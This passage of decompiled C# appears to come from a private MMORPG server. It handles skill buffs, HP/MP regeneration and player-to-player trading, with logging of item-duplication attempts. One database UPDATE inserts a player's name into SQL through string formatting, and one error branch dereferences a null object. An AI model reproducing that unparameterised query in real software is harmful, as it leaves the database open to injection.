								追加状态类 value20 = new 追加状态类(this, 30000, value.FLD_PID, 0);
								追加状态列表.Add(value.FLD_PID, value20);
								状态效果(BitConverter.GetBytes(value.FLD_PID), 1, 30000);
								行走状态(BitConverter.GetBytes(value.FLD_PID), 1);
								发送攻击人物数据(this, base.人物全服ID, value.FLD_PID, 1, 0, 0, 0, -1);
								break;
							}
							case 801302:
							{
								if (GetAddState(value.FLD_PID))
								{
									return;
								}
								追加状态类 value14 = new 追加状态类(this, 60000, value.FLD_PID, 0);
								追加状态列表.Add(value.FLD_PID, value14);
								状态效果(BitConverter.GetBytes(value.FLD_PID), 1, 60000);
								行走状态(BitConverter.GetBytes(value.FLD_PID), 1);
								delFLD_追加百分比_防御(0.2);
								double num8 = base.FLD_人物_追加百分比_回避 += 1.0;
								更新武功和状态();
								break;
							}
							case 901301:
							{
								if (GetAddState(901301))
								{
									新吃药提示();
									return;
								}
								if (GetAddState(901302))
								{
									追加状态列表[901302].时间结束事件();
								}
								if (GetAddState(901303))
								{
									追加状态列表[901303].时间结束事件();
								}
								int num2 = (int)base.琴师_高山流水 * 10000 + 60000;
								追加状态类 value3 = new 追加状态类(this, num2, value.FLD_PID, 0);
								追加状态列表.Add(value.FLD_PID, value3);
								状态效果(BitConverter.GetBytes(value.FLD_PID), 1, num2);
								发送攻击人物数据(this, base.人物全服ID, value.FLD_PID, 1, 0, 0, 0, -1);
								更新武功和状态();
								base.上河调计数 = 0;
								break;
							}
							case 901302:
							{
								if (GetAddState(901302))
								{
									新吃药提示();
									return;
								}
								if (GetAddState(901301))
								{
									追加状态列表[901301].时间结束事件();
								}
								if (GetAddState(901303))
								{
									追加状态列表[901303].时间结束事件();
								}
								int num9 = (int)base.琴师_高山流水 * 10000 + 60000;
								追加状态类 value16 = new 追加状态类(this, num9, value.FLD_PID, 0);
								追加状态列表.Add(value.FLD_PID, value16);
								状态效果(BitConverter.GetBytes(value.FLD_PID), 1, num9);
								发送攻击人物数据(this, base.人物全服ID, value.FLD_PID, 1, 0, 0, 0, -1);
								更新武功和状态();
								base.下河调计数 = 0;
								break;
							}
							case 901303:
							{
								if (base.琴师_高山流水 < 20.0)
								{
									return;
								}
								if (GetAddState(901303))
								{
									新吃药提示();
									return;
								}
								if (GetAddState(901301))
								{
									追加状态列表[901301].时间结束事件();
								}
								if (GetAddState(901302))
								{
									追加状态列表[901302].时间结束事件();
								}
								int num4 = (int)base.琴师_高山流水 * 10000 + 60000;
								追加状态类 value7 = new 追加状态类(this, num4, value.FLD_PID, 0);
								追加状态列表.Add(value.FLD_PID, value7);
								状态效果(BitConverter.GetBytes(value.FLD_PID), 1, num4);
								发送攻击人物数据(this, base.人物全服ID, value.FLD_PID, 1, 0, 0, 0, -1);
								更新武功和状态();
								base.玉连环计数 = 0;
								break;
							}
							case 800103:
							case 810203:
							case 810303:
							case 810403:
							case 810503:
							case 810603:
							case 810703:
							case 820203:
							case 820303:
							case 820403:
							case 820503:
							case 820603:
							case 820703:
							case 830101:
							case 830201:
							case 830301:
							case 830401:
							case 830501:
							case 840101:
							case 840201:
							case 840301:
							case 840401:
							case 840501:
							{
								int num6 = (装备栏已穿装备[3].Get物品ID != 0L) ? 1 : 6;
								if (base.当前激活技能ID == value.FLD_PID)
								{
									base.当前激活技能ID = 0;
								}
								else
								{
									base.当前激活技能ID = value.FLD_PID;
								}
								发送激活技能数据(value.FLD_PID, num6);
								if (num6 != 1)
								{
									base.当前激活技能ID = 0;
								}
								break;
							}
							case 1001101:
								if (GetAddState(1001102))
								{
									追加状态列表[1001102].时间结束事件();
								}
								if (!GetAddState(1001101))
								{
									追加状态类 value11 = new 追加状态类(this, 300000, value.FLD_PID, 0);
									追加状态列表.Add(value.FLD_PID, value11);
									状态效果(BitConverter.GetBytes(value.FLD_PID), 1, 300000);
								}
								行走状态id = 6;
								行走状态(array, 6);
								更新移动速度();
								break;
							case 901401:
							{
								if (base.琴师_高山流水 < 20.0 || 武功新[1, 5] == null || 武功新[1, 6] == null || 武功新[1, 7] == null)
								{
									发送激活技能数据(num, 11);
									return;
								}
								int num11 = 0;
								if (GetAddState(900401))
								{
									num11 = 900401;
								}
								if (GetAddState(900402))
								{
									num11 = 900402;
								}
								if (GetAddState(900403))
								{
									num11 = 900403;
								}
								if (num11 == 0)
								{
									发送激活技能数据(num, 11);
									return;
								}
								追加状态列表[num11].时间结束事件();
								int num12 = (int)base.琴师_高山流水 * 10000 + 60000;
								追加状态类 value19 = new 追加状态类(this, num12, num11, 0);
								追加状态列表.Add(num11, value19);
								状态效果(BitConverter.GetBytes(num11), 1, num12);
								发送攻击人物数据(this, base.人物全服ID, num11, 1, 0, 0, 0, -1);
								更新武功和状态();
								break;
							}
							case 1001202:
							{
								if (GetAddState(1001201) || GetAddState(1001202))
								{
									return;
								}
								追加状态类 value15 = new 追加状态类(this, 3000, value.FLD_PID, 0);
								追加状态列表.Add(value.FLD_PID, value15);
								状态效果(BitConverter.GetBytes(value.FLD_PID), 1, 3000);
								行走状态id = 9;
								行走状态(array, 9);
								更新移动速度();
								break;
							}
							case 1001201:
							{
								if (GetAddState(1001201) || GetAddState(1001202))
								{
									return;
								}
								追加状态类 value12 = new 追加状态类(this, 3000, value.FLD_PID, 0);
								追加状态列表.Add(value.FLD_PID, value12);
								状态效果(BitConverter.GetBytes(value.FLD_PID), 1, 3000);
								行走状态id = 8;
								行走状态(array, 8);
								更新移动速度();
								break;
							}
							case 1001102:
								if (GetAddState(1001101))
								{
									追加状态列表[1001101].时间结束事件();
								}
								if (!GetAddState(1001102))
								{
									追加状态类 value6 = new 追加状态类(this, 300000, value.FLD_PID, 0);
									追加状态列表.Add(value.FLD_PID, value6);
									状态效果(BitConverter.GetBytes(value.FLD_PID), 1, 300000);
								}
								行走状态id = 7;
								行走状态(array, 7);
								更新移动速度();
								break;
							case 1001401:
								if (base.人物坐标_地图 == 28401)
								{
									if ((double)lastX == 0.0 && (double)lastY == 0.0 && lastMAP == 101)
									{
										移动(500f, 1575f, 15f, 101);
									}
									else
									{
										移动(lastX, lastY, 15f, lastMAP);
									}
								}
								else
								{
									lastX = base.人物坐标_X;
									lastY = base.人物坐标_Y;
									lastMAP = base.人物坐标_地图;
									移动(0f, 0f, 15f, 28401);
								}
								break;
							case 1001301:
							{
								if (GetAddState(1001301))
								{
									追加状态列表[1001301].时间结束事件();
									return;
								}
								if (base.人物PK模式 != 0 || GetAddState(1001302) || GetAddState(1001303))
								{
									return;
								}
								int num10 = 10000 + (int)base.韩_火龙问鼎;
								追加状态类 value18 = new 追加状态类(this, num10, value.FLD_PID, 0);
								追加状态列表.Add(value.FLD_PID, value18);
								状态效果(BitConverter.GetBytes(value.FLD_PID), 1, num10);
								发送攻击人物数据(this, base.人物全服ID, value.FLD_PID, 1, 0, 0, 0, -1);
								base.FLD_人物_武功攻击力增加百分比 += 0.05;
								更新武功和状态();
								break;
							}
							case 1001302:
							{
								if (GetAddState(1001302))
								{
									追加状态列表[1001302].时间结束事件();
									return;
								}
								if (base.人物PK模式 != 0 || GetAddState(1001301) || GetAddState(1001303))
								{
									return;
								}
								int num7 = 10000 + (int)base.韩_火龙问鼎;
								追加状态类 value13 = new 追加状态类(this, num7, value.FLD_PID, 0);
								追加状态列表.Add(value.FLD_PID, value13);
								状态效果(BitConverter.GetBytes(value.FLD_PID), 1, num7);
								发送攻击人物数据(this, base.人物全服ID, value.FLD_PID, 1, 0, 0, 0, -1);
								base.FLD_人物_武功攻击力增加百分比 += 0.1;
								更新武功和状态();
								break;
							}
							case 1001303:
							{
								if (GetAddState(1001303))
								{
									追加状态列表[1001303].时间结束事件();
									return;
								}
								if (GetAddState(1001301) || GetAddState(1001302))
								{
									return;
								}
								int num5 = 10000 + (int)base.韩_火龙问鼎;
								追加状态类 value9 = new 追加状态类(this, num5, value.FLD_PID, 0);
								追加状态列表.Add(value.FLD_PID, value9);
								状态效果(BitConverter.GetBytes(value.FLD_PID), 1, num5);
								发送攻击人物数据(this, base.人物全服ID, value.FLD_PID, 1, 0, 0, 0, -1);
								base.FLD_人物_武功攻击力增加百分比 += 0.15;
								更新武功和状态();
								break;
							}
							case 4001401:
								if (base.人物坐标_地图 == 51201)
								{
									if ((double)lastX == 0.0 && (double)lastY == 0.0 && lastMAP == 101)
									{
										移动(500f, 1575f, 15f, 101);
									}
									else
									{
										移动(lastX, lastY, 15f, lastMAP);
									}
								}
								else
								{
									lastX = base.人物坐标_X;
									lastY = base.人物坐标_Y;
									lastMAP = base.人物坐标_地图;
									移动(0f, 0f, 15f, 51201);
								}
								break;
							case 2001301:
							{
								if (GetAddState(2001301))
								{
									追加状态列表[2001301].时间结束事件();
								}
								追加状态类 value2 = new 追加状态类(this, 300000, value.FLD_PID, 0);
								追加状态列表.Add(value.FLD_PID, value2);
								addFLD_追加百分比_攻击(0.03);
								更新武功和状态();
								状态效果(BitConverter.GetBytes(value.FLD_PID), 1, 300000);
								发送攻击人物数据(this, base.人物全服ID, value.FLD_PID, 1, 0, 0, 0, -1);
								break;
							}
							}
							base.人物_MP -= value.FLD_MP;
							更新HP_MP_SP();
						}
					}
					else
					{
						if (自动恢复 != null)
						{
							自动恢复.Enabled = false;
							自动恢复.Close();
							自动恢复.Dispose();
							自动恢复 = null;
						}
						if (BitConverter.ToInt32(array, 0) == 1)
						{
							行走状态id = 1;
							行走状态(array, 1);
							行走状态id1 = 1;
						}
						if (BitConverter.ToInt32(array, 0) == 2)
						{
							跑走 = !跑走;
						}
						行走状态id = 1;
						行走状态id1 = 0;
						行走状态(array, 1);
						更新移动速度();
					}
				}
				else
				{
					发送激活技能数据(num, 11);
				}
			}
			catch
			{
			}
		}

		public void 内功恢复(object sender, ElapsedEventArgs e)
		{
			if (base.人物_HP <= 0)
			{
				base.人物_HP = 0;
				return;
			}
			if ((base.人物_HP >= base.人物最大_HP && base.人物_MP >= base.人物最大_MP) || !打坐)
			{
				if (自动恢复 != null)
				{
					自动恢复.Enabled = false;
					自动恢复.Close();
					自动恢复.Dispose();
					自动恢复 = null;
				}
				return;
			}
			if (base.人物_HP + 160 < base.人物最大_HP)
			{
				base.人物_HP += 160;
			}
			else
			{
				base.人物_HP = base.人物最大_HP;
			}
			if (base.人物_MP + 102 < base.人物最大_MP)
			{
				base.人物_MP += 102;
			}
			else
			{
				base.人物_MP = base.人物最大_MP;
			}
			更新HP_MP_SP();
		}

		public void 障力恢复(object sender, ElapsedEventArgs e)
		{
			if (base.人物_HP <= 0)
			{
				base.人物_HP = 0;
				return;
			}
			if (base.人物_AP >= base.人物最大_AP)
			{
				base.人物_AP = base.人物最大_AP;
				return;
			}
			int num = (int)base.梅_障力运用 + base.FLD_装备_追加_障力恢复量;
			if (num > 0)
			{
				if (base.人物_AP + num < base.人物最大_AP)
				{
					base.人物_AP += num;
				}
				else
				{
					base.人物_AP = base.人物最大_AP;
				}
				更新HP_MP_SP();
			}
		}

		public void 交易成功(Players Playe)
		{
			try
			{
				if (!Playe.退出中)
				{
					if (Playe.交易.交易人.退出中)
					{
						Form1.WriteLine(6, "退出复制BUG12      [" + Playe.交易.交易人.Userid + "][" + Playe.交易.交易人.UserName + "][" + Playe.交易.交易人.Client.ToString() + "]      ");
					}
					else if (Playe.个人商店 != null)
					{
						Form1.WriteLine(6, "非法复制_交易[" + Playe.Userid + "]-[" + Playe.UserName + "]开店交易");
					}
					else if (Playe.交易.交易人.个人商店 != null)
					{
						Form1.WriteLine(6, "非法复制_交易[" + Playe.交易.交易人.Userid + "]-[" + Playe.交易.交易人.UserName + "]开店交易");
					}
					else if (!Playe.打开仓库中)
					{
						Form1.WriteLine(6, "交易成功      BUG![" + Playe.Userid + "]-[" + Playe.UserName + "]");
					}
					else if (!Playe.交易.交易人.打开仓库中)
					{
						Form1.WriteLine(6, "交易成功      BUG![" + Playe.交易.交易人.Userid + "]-[" + Playe.交易.交易人.UserName + "]");
					}
					else if (Playe.交易.交易物品1.Count > Playe.交易.交易人.得到包裹空位数())
					{
						Form1.WriteLine(6, "交易成功      BUG15[" + Playe.交易.交易人.Userid + "]-[" + Playe.交易.交易人.UserName + "]");
					}
					else
					{
						if (Playe.交易.交易钱 <= 0L)
						{
							goto IL_03b3;
						}
						if (Playe.Player_Money >= Playe.交易.交易钱)
						{
							if (Playe.交易.交易人.Player_Money + Playe.交易.交易钱 > World.最大钱数)
							{
								Playe.交易.交易钱 = World.最大钱数 - Playe.交易.交易人.Player_Money;
							}
							Playe.交易.交易人.Player_Money += Playe.交易.交易钱;
							Playe.交易.交易人.更新金钱和负重();
							Playe.Player_Money -= Playe.交易.交易钱;
							Form1.WriteLine(5, "交易金钱      [" + Playe.Userid + "][" + Playe.UserName + "]      和[" + Playe.交易.交易人.Userid + "][" + Playe.交易.交易人.UserName + "](" + Playe.交易.交易钱 + ")");
							goto IL_03b3;
						}
					}
				}
				goto end_IL_0000;
				IL_03b3:
				foreach (交易物品类 value2 in Playe.交易.交易物品1.Values)
				{
					物品类 物品 = value2.物品;
					int num = 得到包裹空位(Playe.交易.交易人);
					if (num == -1)
					{
						break;
					}
					物品类 物品类 = 得到人物物品物品全局ID(Playe, 物品.Get物品全局ID);
					if (物品类 == null)
					{
						string[] array = new string[13]
						{
							"非法复制_交易3[",
							Playe.Userid,
							"]-[",
							Playe.UserName,
							"]物品名称[",
							物品类.得到物品名称(),
							"]      物品名称2[",
							物品.得到物品名称(),
							"]      物品数量[",
							null,
							null,
							null,
							null
						};
						array[9] = Buffer.ToInt32(物品类.物品数量, 0).ToString();
						array[10] = "]      数量[";
						array[11] = Buffer.ToInt32(物品.物品数量, 0).ToString();
						array[12] = "]";
						Form1.WriteLine(6, string.Concat(array));
						break;
					}
					ItmeClass value;
					if (!World.Itme.TryGetValue(Buffer.ToInt32(物品类.物品ID, 0), out value))
					{
						break;
					}
					int fLD_SIDE = value.FLD_SIDE;
					if (value2.物品数量 < 1)
					{
						string[] array2 = new string[13]
						{
							"非法复制_交易22[",
							Playe.Userid,
							"]-[",
							Playe.UserName,
							"]物品名称[",
							物品类.得到物品名称(),
							"]      物品名称2[",
							物品.得到物品名称(),
							"]      物品数量[",
							null,
							null,
							null,
							null
						};
						array2[9] = Buffer.ToInt32(物品类.物品数量, 0).ToString();
						array2[10] = "]      数量[";
						array2[11] = value2.物品数量.ToString();
						array2[12] = "]";
						Form1.WriteLine(6, string.Concat(array2));
						break;
					}
					if (value2.物品数量 > Buffer.ToInt32(物品类.物品数量, 0))
					{
						string[] array3 = new string[13]
						{
							"非法复制_交易2[",
							Playe.Userid,
							"]-[",
							Playe.UserName,
							"]物品名称[",
							物品类.得到物品名称(),
							"]      物品名称2[",
							物品.得到物品名称(),
							"]      物品数量[",
							null,
							null,
							null,
							null
						};
						array3[9] = Buffer.ToInt32(物品类.物品数量, 0).ToString();
						array3[10] = "]      数量[";
						array3[11] = value2.物品数量.ToString();
						array3[12] = "]";
						Form1.WriteLine(6, string.Concat(array3));
						break;
					}
					if (物品类.得到物品位置类型() != 1 && 物品类.得到物品位置类型() != 2 && 物品类.得到物品位置类型() != 5 && 物品类.得到物品位置类型() != 6)
					{
						if (物品类.得到物品位置类型() == 4 && 物品类.FLD_MAGIC1 >= 70000030)
						{
							Form1.WriteLine(6, "交易      出现      没绑物品      [" + Playe.Userid + "][" + Playe.UserName + "]      交易物品      :[" + Playe.交易.交易人.Userid + "][" + Playe.交易.交易人.UserName + "]      物品:" + 物品类.得到物品名称() + "      编号:" + Buffer.ToInt32(物品类.得到全局ID(), 0) + "      数量[" + value2.物品数量 + "]      属性:[" + 物品类.FLD_MAGIC0 + "," + 物品类.FLD_MAGIC1 + "," + 物品类.FLD_MAGIC2 + "," + 物品类.FLD_MAGIC3 + "," + 物品类.FLD_MAGIC4 + "]");
						}
					}
					else if (物品类.FLD_MAGIC1 >= 20000025)
					{
						Form1.WriteLine(6, "交易      出现      没绑物品      [" + Playe.Userid + "][" + Playe.UserName + "]      交易物品      :[" + Playe.交易.交易人.Userid + "][" + Playe.交易.交易人.UserName + "]      物品:" + 物品类.得到物品名称() + "      编号:" + Buffer.ToInt32(物品类.得到全局ID(), 0) + "      数量[" + value2.物品数量 + "]      属性:[" + 物品类.FLD_MAGIC0 + "," + 物品类.FLD_MAGIC1 + "," + 物品类.FLD_MAGIC2 + "," + 物品类.FLD_MAGIC3 + "," + 物品类.FLD_MAGIC4 + "]");
					}
					Form1.WriteLine(5, "[" + Playe.Userid + "][" + Playe.UserName + "]      交易物品      :[" + Playe.交易.交易人.Userid + "][" + Playe.交易.交易人.UserName + "]            物品:" + 物品类.得到物品名称() + "      编号:" + Buffer.ToInt32(物品类.得到全局ID(), 0) + "      数量[" + value2.物品数量 + "]            属性:[" + 物品类.FLD_MAGIC0 + "," + 物品类.FLD_MAGIC1 + "," + 物品类.FLD_MAGIC2 + "," + 物品类.FLD_MAGIC3 + "," + 物品类.FLD_MAGIC4 + "]");
					if (fLD_SIDE == 0 && value2.物品数量 > 1)
					{
						string[] array4 = new string[13]
						{
							"非法复制_交易1[",
							Playe.Userid,
							"]-[",
							Playe.UserName,
							"]物品名称[",
							物品类.得到物品名称(),
							"]      物品名称2[",
							物品.得到物品名称(),
							"]      物品数量[",
							null,
							null,
							null,
							null
						};
						array4[9] = Buffer.ToInt32(物品类.物品数量, 0).ToString();
						array4[10] = "]      数量[";
						array4[11] = value2.物品数量.ToString();
						array4[12] = "]";
						Form1.WriteLine(6, string.Concat(array4));
						break;
					}
					string userid = Playe.Userid;
					string userName = Playe.UserName;
					string userid2 = Playe.交易.交易人.Userid;
					string userName2 = Playe.交易.交易人.UserName;
					double double_ = BitConverter.ToInt64(物品类.物品全局ID, 0);
					int int_ = Buffer.ToInt32(物品类.物品ID, 0);
					string string_ = 物品类.得到物品名称();
					int 物品数量 = value2.物品数量;
					string string_2 = 物品类.FLD_MAGIC0 + "-" + 物品类.FLD_MAGIC1 + "-" + 物品类.FLD_MAGIC2 + "-" + 物品类.FLD_MAGIC3 + "-" + 物品类.FLD_MAGIC4 + "初" + 物品类.FLD_FJ_觉醒 + "中" + 物品类.FLD_FJ_中级附魂 + "进" + 物品类.FLD_FJ_进化;
					RxjhClass.物品记录(userid, userName, userid2, userName2, double_, int_, string_, 物品数量, string_2, 0, "交易");
					物品类.FLD_FJ_NJ = 0;
					if (是否灵兽(Buffer.ToInt32(物品类.物品ID, 0)))
					{
						DBA.ExeSqlCommand(string.Format("UPDATE      TBL_XWWL_Cw      SET      ZrName='{1}',FLD_ZCD={2}      WHERE      ItmeId={0}", BitConverter.ToInt64(物品类.物品全局ID, 0), Playe.交易.交易人.UserName, 0));
					}
					Playe.交易.交易人.增加物品(物品类.物品全局ID, 物品类.物品ID, num, Buffer.GetBytes(value2.物品数量), 物品类.物品属性);
					Playe.减去物品(物品类.物品位置, value2.物品数量);
				}
				end_IL_0000:;
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "交易成功出错      [" + Playe.Userid + "][" + Playe.UserName + "][" + Playe.Client.ToString() + "]和[" + Playe.交易.交易人.Userid + "][" + Playe.交易.交易人.UserName + "][" + Playe.交易.交易人.Client.ToString() + "]      " + ((ex != null) ? ex.ToString() : null));
			}
		}

		public void 交易放东西(byte[] 封包数据, int length)
		{
			if (!打开仓库中)
			{
				Form1.WriteLine(6, "交易放东西  BUG![" + base.Userid + "]-[" + base.UserName + "]");
			}
			else
			{
				try
				{
					封包修改(封包数据, length);
					byte[] dst = new byte[World.数据库单个物品大小];
					byte[] array = new byte[8];
					byte[] array2 = new byte[4];
					byte[] array3 = new byte[8];
					System.Buffer.BlockCopy(封包数据, 22, dst, 0, 16);
					System.Buffer.BlockCopy(封包数据, 42, dst, 16, World.物品属性大小);
					System.Buffer.BlockCopy(封包数据, 22, array, 0, 8);
					System.Buffer.BlockCopy(封包数据, 34, array2, 0, 4);
					System.Buffer.BlockCopy(封包数据, 42, array3, 0, 8);
					ItmeClass value;
					if (BitConverter.ToInt64(array3, 0) >= 1L && World.Itme.TryGetValue(BitConverter.ToInt32(array2, 0), out value) && value.FLD_QUESTITEM != 1)
					{
						if (value.FLD_LOCK == 1)
						{
							系统提示("锁定的物品禁止交易。");
						}
						else if (BitConverter.ToInt32(array2, 0) == 2000000000)
						{
							long num = BitConverter.ToInt64(array3, 0);
							if (num > 0L && num <= World.最大钱数 && num <= base.Player_Money && num + 交易.交易钱 <= base.Player_Money)
							{
								if (交易.交易人.Player_Money + num > World.最大钱数)
								{
									系统提示("对方随身携带总额已超过[" + World.最大钱数 / 100000000L + "亿]两。");
								}
								else
								{
									交易.交易钱 += num;
									byte[] array4 = Converter.hexStringToByte("AA55760098009A00680001000000010000000000000000000000000000000000000000943577000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000CD055AA");
									System.Buffer.BlockCopy(BitConverter.GetBytes(num), 0, array4, 42, 8);
									System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array4, 4, 2);
									if (base.Client != null)
									{
										base.Client.Send多包(array4, array4.Length);
									}
									if (交易.交易人.Client != null)
									{
										交易.交易人.Client.Send多包(array4, array4.Length);
									}
								}
							}
						}
						else if (BitConverter.ToInt64(array, 0) != 0L)
						{
							物品类 物品类 = 得到人物物品物品全局ID(this, BitConverter.ToInt64(array, 0));
							if (物品类 != null && !物品类.物品绑定 && !交易.交易物品1.ContainsKey(BitConverter.ToInt64(array, 0)))
							{
								交易物品类 交易物品类 = new 交易物品类();
								交易物品类.物品 = 物品类;
								交易物品类.物品数量 = BitConverter.ToInt32(array3, 0);
								if (交易物品类.物品数量 >= 1)
								{
									交易.交易物品1.Add(BitConverter.ToInt64(array, 0), 交易物品类);
									byte[] array5 = Converter.hexStringToByte("AA55760094029A0068000100000001000000000000008716E56781832006000000000208AF2F000000000100000000000000470D03000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000CD055AA");
									System.Buffer.BlockCopy(物品类.物品_byte, 0, array5, 22, 8);
									System.Buffer.BlockCopy(物品类.物品_byte, 8, array5, 34, 4);
									System.Buffer.BlockCopy(array3, 0, array5, 42, 8);
									System.Buffer.BlockCopy(物品类.物品_byte, 16, array5, 50, World.物品属性大小);
									System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array5, 4, 2);
									if (base.Client != null)
									{
										base.Client.Send(array5, array5.Length);
									}
									if (交易.交易人.Client != null)
									{
										交易.交易人.Client.Send多包(array5, array5.Length);
									}
									if (是否灵兽(BitConverter.ToInt32(array2, 0)))
									{
										发送灵兽数据((int)BitConverter.ToInt64(array, 0));
										交易.交易人.发送灵兽数据((int)BitConverter.ToInt64(array, 0));
									}
								}
							}
						}
					}
				}
				catch (Exception ex)
				{
					Form1.WriteLine(1, "交易放东西出错  [" + base.Userid + "][" + base.UserName + "][" + base.Client.ToString() + "]  " + ((ex != null) ? ex.ToString() : null));
				}
			}
		}

		public void 交易大类(byte[] 封包数据, int length)
		{
			try
			{
				封包修改(封包数据, length);
				if (base.Player_Level < 15)
				{
					系统提示("人物级别小于" + 15 + "不允许进行交易。", 50, "系统提示");
				}
				else if (World.当前是否是银币线路 == 1)
				{
					系统提示("当前线路不能交易！", 50, "系统提示");
				}
				else
				{
					byte[] array = new byte[4];
					byte[] array2 = new byte[4];
					System.Buffer.BlockCopy(封包数据, 18, array, 0, 4);
					System.Buffer.BlockCopy(封包数据, 10, array2, 0, 4);
					int 人物的ID = BitConverter.ToInt32(array, 0);
					int num = BitConverter.ToInt32(array2, 0);
					switch (num)
					{
					case 1:
						发送交易请求(人物的ID, num);
						break;
					case 2:
						接受交易请求(人物的ID, num);
						break;
					case 3:
						对方取消交易请求(人物的ID, num);
						break;
					case 4:
						本人取消交易请求(人物的ID, num);
						break;
					case 5:
						同意接受(人物的ID, num);
						break;
					case 6:
						关闭交易(人物的ID, num);
						break;
					}
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "交易大类出错  [" + base.Userid + "][" + base.UserName + "][" + base.Client.ToString() + "]  " + ((ex != null) ? ex.ToString() : null));
			}
		}

		public void 同意接受(int 人物的ID, int 操作ID)
		{
			try
			{
				if (!退出中)
				{
					byte[] array = Converter.hexStringToByte("AA55420000009800340001000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000055AA");
					System.Buffer.BlockCopy(BitConverter.GetBytes(操作ID), 0, array, 10, 4);
					System.Buffer.BlockCopy(BitConverter.GetBytes(操作ID), 0, array, 14, 4);
					byte[] bytes = Encoding.Default.GetBytes(base.UserName);
					System.Buffer.BlockCopy(bytes, 0, array, 22, bytes.Length);
					System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 18, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
					if (base.Client != null)
					{
						base.Client.Send多包(array, array.Length);
					}
					if (交易.交易人.Client != null)
					{
						交易.交易人.Client.Send多包(array, array.Length);
					}
					交易.交易接受 = true;
					if (交易.交易人.交易.交易接受)
					{
						if (交易.交易人.Client.Running)
						{
							交易成功(this);
							交易.交易物品1.Clear();
							更新金钱和负重();
							交易成功(交易.交易人);
							保存人物数据存储过程();
							交易.交易人.保存人物数据存储过程();
							交易.交易人.交易.交易物品1.Clear();
							交易.交易人.更新金钱和负重();
							打开仓库中 = false;
							交易.交易人.打开仓库中 = false;
							交易.关闭交易();
						}
					}
					else
					{
						Form1.WriteLine(5, "[" + base.Userid + "][" + base.UserName + "]  交易就绪  [" + 交易.交易人.Userid + "][" + 交易.交易人.UserName + "]");
					}
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "同意接受出错  [" + base.Userid + "][" + base.UserName + "][" + base.Client.ToString() + "]  " + ((ex != null) ? ex.ToString() : null));
			}
		}

		public void 关闭交易(int 人物的ID, int 操作ID)
		{
			try
			{
				byte[] array = Converter.hexStringToByte("AA55420000009800340001000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000055AA");
				System.Buffer.BlockCopy(BitConverter.GetBytes(操作ID), 0, array, 10, 4);
				System.Buffer.BlockCopy(BitConverter.GetBytes(操作ID), 0, array, 14, 4);
				byte[] bytes = Encoding.Default.GetBytes(base.UserName);
				System.Buffer.BlockCopy(bytes, 0, array, 22, bytes.Length);
				System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 18, 2);
				System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
				if (base.Client != null)
				{
					base.Client.Send(array, array.Length);
				}
				if (交易.交易人.Client != null)
				{
					交易.交易人.Client.Send(array, array.Length);
				}
				交易.关闭交易();
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "关闭交易出错  [" + base.Userid + "][" + base.UserName + "][" + base.Client.ToString() + "]  " + ((ex != null) ? ex.ToString() : null));
			}
		}

		public void 接受交易请求(int 人物的ID, int 操作ID)
		{
			try
			{
				byte[] array = Converter.hexStringToByte("AA55420000009800340001000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000055AA");
				System.Buffer.BlockCopy(BitConverter.GetBytes(操作ID), 0, array, 10, 4);
				System.Buffer.BlockCopy(BitConverter.GetBytes(操作ID), 0, array, 14, 4);
				byte[] bytes = Encoding.Default.GetBytes(交易.交易人.UserName);
				System.Buffer.BlockCopy(bytes, 0, array, 22, bytes.Length);
				System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
				System.Buffer.BlockCopy(BitConverter.GetBytes(交易.交易人.Player_Job), 0, array, 59, 1);
				System.Buffer.BlockCopy(BitConverter.GetBytes(交易.交易人.Player_Job_leve), 0, array, 60, 1);
				System.Buffer.BlockCopy(BitConverter.GetBytes(交易.交易人.Player_Zx), 0, array, 61, 1);
				if (base.Client != null)
				{
					base.Client.Send(array, array.Length);
				}
				交易.交易中 = true;
				交易.交易人.交易.交易中 = true;
				打开仓库中 = true;
				交易.交易人.打开仓库中 = true;
				打开仓库中 = true;
				交易.交易人.打开仓库中 = true;
				byte[] bytes2 = Encoding.Default.GetBytes(base.UserName);
				System.Buffer.BlockCopy(bytes2, 0, array, 23, bytes2.Length);
				System.Buffer.BlockCopy(BitConverter.GetBytes(交易.交易人.人物全服ID), 0, array, 4, 2);
				System.Buffer.BlockCopy(BitConverter.GetBytes(base.Player_Job), 0, array, 59, 1);
				System.Buffer.BlockCopy(BitConverter.GetBytes(base.Player_Job_leve), 0, array, 60, 1);
				System.Buffer.BlockCopy(BitConverter.GetBytes(base.Player_Zx), 0, array, 61, 1);
				if (交易.交易人.Client != null)
				{
					交易.交易人.Client.Send多包(array, array.Length);
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "接受交易请求出错  [" + base.Userid + "][" + base.UserName + "][" + base.Client.ToString() + "]  " + ((ex != null) ? ex.ToString() : null));
			}
		}

		public void 对方取消交易请求(int 人物的ID, int 操作ID)
		{
			try
			{
				byte[] array = Converter.hexStringToByte("AA55420000009800340001000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000055AA");
				System.Buffer.BlockCopy(BitConverter.GetBytes(操作ID), 0, array, 10, 4);
				System.Buffer.BlockCopy(BitConverter.GetBytes(操作ID), 0, array, 14, 4);
				byte[] bytes = Encoding.Default.GetBytes(base.UserName);
				System.Buffer.BlockCopy(bytes, 0, array, 22, bytes.Length);
				System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 18, 2);
				System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
				if (base.Client != null)
				{
					base.Client.Send(array, array.Length);
				}
				if (交易.交易人.Client != null)
				{
